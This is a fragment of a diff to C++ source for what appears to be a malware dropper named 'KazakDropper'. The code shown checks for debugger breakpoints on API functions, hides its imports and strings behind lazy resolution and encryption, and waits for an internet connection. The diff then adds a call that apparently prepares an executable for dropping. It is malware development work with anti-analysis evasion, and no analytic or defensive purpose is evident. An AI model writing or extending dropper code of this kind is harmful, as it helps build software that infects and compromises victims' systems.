@@ -10,8 +10,6 @@
 
 #include "../headers/Kazak.h"
 
-#pragma comment(linker, "/arch:x86")
-
 BOOL KazakDropper::IsBp(const char* lpszModule, const char* lpszFunction)
 {
 	HINSTANCE hLibrary;
@@ -116,6 +114,9 @@ int main()
 
 		while (!li(InternetCheckConnectionA)(enc("https://google.com"), FLAG_ICC_FORCE_CONNECTION, 0))
 			Sleep(1000);
+
+
+		KazakDropper::PrepareExe();
 
 
 
